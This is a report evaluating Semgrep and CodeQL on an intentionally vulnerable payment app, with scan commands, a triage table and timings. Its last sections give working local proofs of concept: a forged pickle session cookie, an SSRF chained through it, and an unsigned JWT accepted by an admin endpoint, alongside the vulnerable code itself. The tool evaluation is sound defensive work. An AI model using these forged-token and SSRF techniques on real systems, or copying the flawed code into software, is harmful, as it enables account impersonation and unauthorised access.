# Part 1 — SAST Tools Evaluation

## Local environment and Reproducibility

### Tools Version
```markdown
% semgrep --version
1.174.0
```

```markdown
% codeql --version 
CodeQL command-line toolchain release 2.26.3.
Copyright (C) 2019-2026 GitHub, Inc.
..SNIP..
```

### Local Runs
#### Semgrep using `--config auto`.

```bash
%  semgrep scan \
  --time \
  --config auto \
  --error \
  --json-output=./artifacts/semgrep-auto.json \
  --sarif-output=./artifacts/semgrep-auto.sarif \
  --text-output=./artifacts/semgrep-auto.txt \
  .
```

#### Semgrep using `--config semgrep/rules.yml` (Rules customization exploration).
```bash
% semgrep scan \
  --time \
  --config semgrep/rules.yml \
  --json-output=./artifacts/semgrep-custom.json \
  --sarif-output=./artifacts/semgrep-custom.sarif \
  --text-output=./artifacts/semgrep-custom.txt \
  .
```

#### Create CodeQL Python DB
```bash
% codeql database create artifacts/codeql-python --language=python --source-root=.
```

#### Create CodeQL Javascript DB
```bash
 % codeql database create artifacts/codeql-javascript --language=javascript --source-root=.
```

#### Create CodeQL Java DB
```bash 
% cd services/settlement
% codeql database create ../../artifacts/codeql-java \
  --language=java \
  --source-root=. \
  --command='mvn clean package'
```

#### Create CodeQL Go
```bash
% cd services/ledger
% codeql database create ../../artifacts/codeql-go \
  --language=go \
  --source-root=. \
  --command='go build ./...'
```

#### Analyze using CodeQL
```
## python
% codeql database analyze artifacts/codeql-python \
  codeql/python-queries:codeql-suites/python-code-scanning.qls \
  --format=sarif-latest \
  --output=artifacts/codeql-python.sarif

## js
codeql database analyze artifacts/codeql-javascript \
  codeql/javascript-queries:codeql-suites/javascript-code-scanning.qls \
  --format=sarif-latest \
  --output=artifacts/codeql-javascript.sarif

## java
codeql database analyze artifacts/codeql-java \
  codeql/java-queries:codeql-suites/java-code-scanning.qls \
  --format=sarif-latest \
  --output=artifacts/codeql-java.sarif    

## go
codeql database analyze artifacts/codeql-go \
  codeql/go-queries:codeql-suites/go-code-scanning.qls \
  --format=sarif-latest \
  --output=artifacts/codeql-go.sarif
```

## Comparison table

| **Criterion** | Semgrep | CodeQL | Notes |
|---|---|---|---|
| **Languages in this repository** | Supports Python, JavaScript, Java, and Go in the selected scans. Verified against target-app; registry scans analyzed all four service languages | Supports Python, JavaScript, Java, and Go. Verified against target-app; CodeQL databases build and analyzed for all four languages | **Vendor documentation:** Both tools list these languages as supported |
| **Findings returned** | 34 with `auto` | 10 Python, 7 JavaScript, 2 Go, and 1 Java security results | **Verified against target-app:** counts came from the `JSON/SARIF` artifacts in `artifacts/` |
| **Findings assessed real** | AI Assisted | AI Assisted | **Verified against target-app:** See Triage table |
| **Scan duration** | AI Assisted | AI Assisted | **Verified against target-app:** See Duration measurement |
| **Setup friction** | Easy local installation and setup. One command run. | CLI available. Database build required. Source build for compiled languages. | **Verified against target-app:** Documented in the reproducibility section above |
| **Rule customisability** | YAML patterns and taint rules | QL query packs and custom queries | **Vendor documentation:** both support custom detection logic.<br><br>**Verified against target-app:** `semgrep/rules.yml` validated and ran 5 rules (AI assisted rule authoring); standard CodeQL packs ran, with no custom QL query authored. |
| **Licensing/cost** | Free edition available; paid Teams and Enterprise features | CodeQL CLI terms and GitHub Advanced Security requirements apply to private repositories | **Vendor documentation:** pricing and license terms were reviewed for both tools. Semgrep $30/committer/month. CodeQL $35/committer/month |
| **Output and CI fit** | Text, JSON, SARIF | SARIF and GitHub Code Scanning Action | **Vendor documentation:** both integrate with CI; SARIF is the interchange format. Semgrep supports multiple CI integration. |
| **Maintenance burden** | Repository-owned local rules plus registry/policy review | Query packs plus language-specific build configuration | **Vendor documentation:** rules, query packs, and integrations require ongoing updates |

## Triage
Caveat: AI agent assisted analysis. Further reasoned and judgemet by human in the Four-findings evaluation sections.

Legend: **TP** = real, verified by hand · **FP** = flagged but not actually exploitable·

### True Positives
| # | Location | Issue | Caught by | Notes |
|---|---|---|---|---|
| 1 | `services/api/auth.py:18` | `pickle.loads` on an attacker-controlled session cookie → RCE | Semgrep + CodeQL | **TP**. CodeQL flags `py/unsafe-deserialization`, and the cookie/session value flows directly into `pickle.loads`. This is a real deserialization exploit and reachable from attacker-controlled input. |
| 2 | `services/api/db.py:35` | SQL injection via `reference` / `status` query params, built with f-string SQL | Semgrep + CodeQL | **TP**. Semgrep flags the raw f-string SQL, and CodeQL reports `py/sql-injection`. The request parameters flow directly into the SQL sink. |
| 3 | `services/api/app.py:62` | `banner` query param concatenated into a rendered template string → server-side template injection | Semgrep + CodeQL | **TP**. Semgrep raises a raw HTML/template warning, and CodeQL flags `py/template-injection`. This is more severe than simple XSS because Jinja SSTI can lead to code execution. |
| 4 | `services/api/receipts.py:15-16` | `subprocess.run(f"wkhtmltopdf --quiet {src} {dst}", shell=True)` → command injection | Semgrep + CodeQL | **TP**. The receipt filename/path is attacker-controlled and flows into a shell command. This is directly reachable and chains with the path traversal issue below. |
| 5 | `services/api/app.py:86` and `services/api/receipts.py:7-8` | Unvalidated `filename` path param used to build filesystem paths → path traversal | CodeQL only | **TP**. CodeQL reports `py/path-injection` twice. The attacker-controlled filename reaches filesystem path construction. Semgrep missed this in the default configuration. |
| 6 | `services/api/webhooks_out.py:8` | Outbound GET to merchant-supplied URL → SSRF | CodeQL only | **TP**. CodeQL reports `py/full-ssrf`. A user-controlled URL is used in a server-side outbound request. |
| 7 | `services/settlement/src/main/java/com/coda/settlement/SettlementParser.java:12-17` | XXE on acquirer-uploaded file | Semgrep only | **TP**. Semgrep reports an XXE sink in the XML parser. The XML document builder is not hardened against entity expansion in this code path. |
| 8 | `services/settlement/src/main/java/com/coda/settlement/LedgerRepository.java:26` | SQL injection via concatenated `merchantId` / `batchRef` values | Semgrep + CodeQL | **TP**. Semgrep flags `formatted-sql-string`; CodeQL flags `java/concatenated-sql-query`. The unsafe SQL string concatenation is present and reachable from untrusted values. |
| 9 | `services/webhooks/lib/verify.js:19-21` | `jwt.decode` without verification used to gate `/admin/config` | Semgrep only | **TP**. The route uses decoded claims without verification. This is an authentication bypass pattern and a real issue even though CodeQL did not flag it in the default suite. |
| 10 | `services/webhooks/lib/verify.js:23-25` | `jwt.verify(..., { algorithms: ['none', 'HS256'] })` accepts unsigned tokens | Semgrep only | **TP**. The code explicitly permits the `none` algorithm, which is insecure. This is a real JWT validation issue. |
| 11 | `services/webhooks/lib/config.js:18` | Prototype pollution via recursive deep-merge assignment | CodeQL only | **TP**. CodeQL reports `js/prototype-pollution-utility`. Attacker-controlled config keys can pollute object prototypes and change application behavior. |
| 12 | `services/webhooks/server.js:29` and `services/webhooks/lib/render.js:15-17` | Reflected XSS via unescaped `message`/rendered value | Semgrep + CodeQL | **TP**. The output is rendered into HTML from user-controlled input. One of the reported JS XSS findings is a valid sink; the surrounding logic confirms this is an actual output path. |
| 13 | `services/webhooks/server.js:60` | `/admin/export` executes shell command built from request data | Semgrep + CodeQL | **TP**. User-controlled `partner`/`day` values are interpolated into a shell command. The sink is reachable and exploitable. |
| 14 | `services/webhooks/lib/verify.js:6` | Hardcoded HMAC secret in source | Semgrep only | **TP**. A static secret is committed in source. This is a real secret exposure issue and matches the generic secret-pattern rule. |
| 15 | `services/ledger/main.go:18-21` | `reconcile()` executes `sh -c` with request-controlled region | Semgrep + CodeQL | **TP**. The request body flows directly into a shell command. This is the clearest confirmed command-injection issue and matches both tools. |

### False positives / low-confidence findings

| # | Location | Issue | Caught by | Notes |
|---|---|---|---|---|
| FP-1 | `services/api/db.py:20-24` | String-built SQL, looks similar to SQL injection | Semgrep (low confidence) | **FP**. `column` is restricted by a hardcoded whitelist before reaching the query string. User input never reaches the SQL text directly. |
| FP-2 | `services/webhooks/lib/render.js:11-13` | HTML template literal | Semgrep | **FP**. The values are sanitized by `escapeHtml()` before rendering. Semgrep pattern matching lacked escaping awareness. |
| FP-3 | `services/api/util/crypto.py:21-24` | MD5 usage | Semgrep + CodeQL | **FP**. The value is a cache key, not an auth or integrity control. |
| FP-4 | `services/api/tests/test_auth.py:4-5` | Strings shaped like live API keys / webhook secrets | Semgrep secret rule | **FP / triage**. They are test fixtures with `_test_` names and placeholder entropy. |

## Duration measurement
Caveat: AI agent assisted analysis.

Semgrep was measured as one scan. CodeQL was measured in two phases: database creation, which includes extraction and any required build, followed by query analysis. The `real` value from `/usr/bin/time -p` is the wall-clock time used for comparison. CodeQL runs used a workspace temporary directory to avoid a macOS temporary-path permission issue.

| Tool and scope | Phase | Wall clock (`real`) |
|---|---|---:|
| Semgrep `auto` on `services/` | Scan | 8.17s |
| Semgrep custom rules on `services/` | Scan | 1.23s |
| CodeQL Python | Database creation | 1.97s |
| CodeQL Python | Query analysis | 5.26s |
| CodeQL JavaScript | Database creation | 3.07s |
| CodeQL JavaScript | Query analysis | 9.10s |
| CodeQL Java | Database creation, including `mvn clean package` | 13.23s |
| CodeQL Java | Query analysis | 8.39s |
| CodeQL Go | Database creation | 8.02s |
| CodeQL Go | Query analysis | 5.23s |

**Verified against target-app:** Semgrep analyzed 17 application files. CodeQL
analyzed 10 Python, 4 JavaScript, 3 Java, and 2 Go files. CodeQL end-to-end
totals were Python 7.23s, JavaScript 12.17s, Java 21.62s, and Go 13.25s.
These totals include database creation; Semgrep has no database phase.

## Three Findings evaluation

### Case 1: Python insecure deserialization (pickle)
This is a confirmed insecure deserialization vulnerability in `services/api/auth.py`.

The vulnerable flow is:

1. The client sends a `paylink_session` cookie.
2. The server base64-decodes it and passes the bytes straight to `pickle.loads(...)`, with no signature or integrity check.
3. Whatever `merchant_id` value the pickle stream reconstructs is trusted as the caller's identity — no check that it belongs to a real merchant.

#### The vulnerable sink
File: `services/api/auth.py:11-18`
```python
def current_merchant(request):
    raw = request.cookies.get("paylink_session")
    if not raw:
        return None
    blob = base64.b64decode(raw)
    session = pickle.loads(blob)
    return session.get("merchant_id")
```
Base64 is an encoding, not a security control — nothing proves the cookie was issued by the server. 

Forging a cookie:
```bash
% python3 -c "
import pickle, base64
payload = {'merchant_id': 'mch_test'}
print(base64.b64encode(pickle.dumps(payload)).decode())"
gAWVHQAAAAAAAAB9lIwLbWVyY2hhbnRfaWSUjAhtY2hfdGVzdJRzLg==
```
The output is a valid paylink_session cookie value that impersonates any
merchant identity the attacker chooses — no real login, password, or token
required:

#### Tested locally by bringing up the service
Making a request using the forged cookie:
```bash
% curl -s http://localhost:8080/healthz
{
  "ok": true
}

% curl -s http://localhost:8080/v1/transactions \
  -b "paylink_session=gAWVHQAAAAAAAAB9lIwLbWVyY2hhbnRfaWSUjAhtY2hfdGVzdJRzLg=="
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
  "http://www.w3.org/TR/html4/loose.dtd">
<html>
  <head>
    <title>sqlite3.OperationalError: no such table: transactions // Werkzeug Debugger</title>
    <link rel="stylesheet" href="?__debugger__=yes&amp;cmd=resource&amp;f=style.css"
        type="text/css">
    <!-- We need to make sure this has a favicon so that the debugger does
         not accidentally trigger a request to /favicon.ico which might
         change the application's state. -->
    <link rel="shortcut icon"
        href="?__debugger__=yes&amp;cmd=resource&amp;f=console.png">
    <script src="?__debugger__=yes&amp;cmd=resource&amp;f=debugger.js"></script>
    <script type="text/javascript">
      var TRACEBACK = 281472758022032,
          CONSOLE_MODE = false,
          EVALEX = true,
          EVALEX_TRUSTED = false,
          SECRET = "apeFq4b6johUWlUU6mb2";
    </script>
  </head>
..SNIP..
```

### Case 2: Python Server-Side Request Forgery
The CodeQL finding is reported at: `services/api/webhooks_out.py:8`

The vulnerability is a server-side request forgery (SSRF) in `probe_endpoint(...)`.

The request flow is:

1. A client sends a URL to the `/v1/webhooks/probe` endpoint.
2. The application reads the URL from the JSON request body.
3. The URL is passed to `probe_endpoint(...)`.
4. `probe_endpoint(...)` sends a server-side HTTP request to that URL.
5. The application returns part of the response to the client.

#### 1) The application accepts a URL from the request body

File: `services/api/app.py:119-125`

```python
@app.post("/v1/webhooks/probe")
def webhook_probe():
    merchant = current_merchant(request)
    if not merchant:
        abort(401)
    body = request.get_json(force=True) or {}
    return jsonify(probe_endpoint(body.get("url", "")))
```

The URL comes from:
```python
body.get("url", "")
```
No hostname validation, allowlist, scheme restriction, or private-network blocking is applied.

#### 2) The URL is passed to probe_endpoint
```python
return jsonify(probe_endpoint(body.get("url", "")))
```

#### 3) The server makes the outbound request
```python
def probe_endpoint(url):
    resp = requests.get(url, timeout=TIMEOUT, allow_redirects=True)
    return {"status": resp.status_code, "body": resp.text[:2048]}
```
The vulnerable sink is:
```python
requests.get(url, timeout=TIMEOUT, allow_redirects=True)
```
#### Tested locally by bringing up the service. Chained Case 1 by forging session cookie. 
An authenticated attacker could submit:
```bash
% curl -s -X POST http://localhost:8080/v1/webhooks/probe \
  -H "Content-Type: application/json" \
  -b "paylink_session=gAWVHQAAAAAAAAB9lIwLbWVyY2hhbnRfaWSUjAhtY2hfdGVzdJRzLg==" \
  -d '{"url": "http://webhooks:8081/healthz"}'
{
  "body": "{\"ok\":true}", 
  "status": 200
}

% curl -s -X POST http://localhost:8080/v1/webhooks/probe \
  -H "Content-Type: application/json" \
  -b "paylink_session=gAWVHQAAAAAAAAB9lIwLbWVyY2hhbnRfaWSUjAhtY2hfdGVzdJRzLg==" \
  -d '{"url": "https://www.google.com"}'
{
  "body": "<!doctype html><html itemscope=\"\" itemtype=\"http://schema.org/WebPage\" lang=\"en-MY\"><head><meta content=\"text/html; charset=UTF-8\" http-equiv=\"Content-Type\"><meta content=\"/images/branding/googleg/1x/googleg_standard_color_128dp.png\" itemprop=\"image\"><title>Google</title><script nonce=\"_5k73y0QDH7Zp873VwZg9A\">(function(){var _g={kEI:'6DKaauW1NLS64-EPyua-sA0',kEXPI:'0,4318858,6397,9708,344796,226411,5293914,12270,6,199,540,55,5991670,9,16,12,56047947,217551,176146,107648,41099,26230,25591,46339,10840,2,21719,16179,2646,4537,35597,3,1515,3355,12011,12,17402,5089,3027,13,782,14627,21996,5337,2891,2,13,8516,19726,5,964,2,147,34657,2,6335,14329,2,4981,10,13528,6293,10880,12548,2676,8751,1930,12246,7187,3933,21017371,4,2960,3,10051,3,17892,24,56,3,3780,2,6508412,6,8300,8372,3,2981,1248,3,1567,223,3,269,2043,570,3,497,1239,635,135,284,937,597,3,732,1681,652,73804,673,2437294,1078330,1960766,12052839,1503667,1,105685,19712,2,326092,5,73959,3588,244118,388,121544,656969,3,1070,2,1246,475,6776,7,7,7,12229,4616,1247,1109,4895,5354,576,377,3527,484,5,18,15698,11451,5,955,6593,306,4,3815,253,920,5,4025,11,6810,9,13,7936,3396,1049,815,1734,7889,953,421,12,1708,4,4585,911,4299,1535,1530,1150,90,6251,282,7286,11,9727,4,11649,12034,2398,4,1483,2476,5852,8672,4,26,278,57,5,695,5,58,4,3315,2624,2048,4,3621,5,259,2,1569,1,2603,1,689,221,5,1132,4449,5,1615,4,7597,563,2352,1,1,3,19,1,3744,5,642,371,2881,892,1245,2,17,252,3521,6,4,131,4,480,4,852,2003,4,2002,101,2,453,5,202,4,11964,4,933,4,69,5,6213,1638,2879,5,1253,5,653,4,2993,804,276,4,193,3491,5,379,2711,1,563,5,1293,5,29,2747,2952,256,4,13135,1070,5,1507,1243,4,1566,2061,557,417,309,1,472,930,2,281,4,2047,4,1478,4,1634,1168,4,177,4,2698,4,6653,780,5,2587,7,735,4657,1289,4,571,236,501,5,578,3,2,2,2,381,3,2,2,2,13,2,4,3556,652,10,1848,3,1732,4,2702,1,2,4087,4,2862,2266,3,2,2,2,221,4,755,587,2239,189,3,2,2,2,44,82,4,2415,546,2819,143,2,1028,4,2726,981,4,2100,409,553,4,512,4,1184,5,1702,4,759,65,3,2,2,2,106,2,3295,1586,333,5,1117,11,11,3342,10,159,373,3,179,5,240,413,1,2,3301,400,737,", 
  "status": 200
}
```
### Case 3: Missing JWT signature verification

File: `services/webhooks/lib/verify.js:19-21`

```js
function replayClaims(token) {
  return jwt.decode(token);
}
```
Called from `services/webhooks/server.js:32-36`:

```js
app.post('/admin/config', (req, res) => {
  const claims = replayClaims(req.get('X-Operator-Token'));
  if (!claims) return res.status(401).json({ error: 'no token' });
  applyOverrides(req.body || {});
  res.json(snapshot());
});
```

1. Client sends `POST` `/admin/config` with an `X-Operator-Token` header and a JSON body.
2. `replayClaims(token)` calls `jwt.decode(token)`, which parses the token structurally but checks nothing about its signature.

```python
 % python3 -c "
import base64, json

def b64url(d):
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

header = b64url(json.dumps({'alg': 'HS256', 'typ': 'JWT'}).encode())
payload = b64url(json.dumps({'role': 'admin', 'sub': 'attacker'}).encode())
print(f'{header}.{payload}.this-signature-is-never-checked')
"
eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJyb2xlIjogImFkbWluIiwgInN1YiI6ICJhdHRhY2tlciJ9.this-signature-is-never-checked

syafiq@Syafiqs-MacBook-Air target-app % curl -s -X POST http://localhost:8081/admin/config \
  -H "Content-Type: application/json" \
  -H "X-Operator-Token: eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJyb2xlIjogImFkbWluIiwgInN1YiI6ICJhdHRhY2tlciJ9.this-signature-is-never-checked" \
  -d '{"features": {"replay": true}}'
{"retries":3,"backoffMs":500,"partners":{},"features":{"replay":true,"strictSignature":true}}%    
```

### Conclusion from the three cases

1. The pickle deserialization case demonstrates agreement between Semgrep and CodeQL on a critical, reachable vulnerability.

2. CodeQL identified a confirmed server-side request forgery vulnerability, which was verified locally by chaining the forged session cookie from Case 1 into `/v1/webhooks/probe` to reach the internal `webhooks` service — confirming the SSRF is both reachable and exploitable, not just theoretically reachable.

3. The missing JWT signature verification case, caught by Semgrep only, was confirmed exploitable with a completely unsigned token: `jwt.decode()` never validates the signature at all, so `/admin/config` accepted a forged admin token and mutated live server config with no valid credentials whatsoever.

## Overall assessment

- **Semgrep** was effective at detecting explicit insecure code patterns.
- **CodeQL** was effective at tracing data from request-controlled sources to security-sensitive sinks.

Semgrep contributes fast pattern-based detection and straightforward rule customization, while CodeQL contributes deeper data-flow analysis and reachability reasoning.
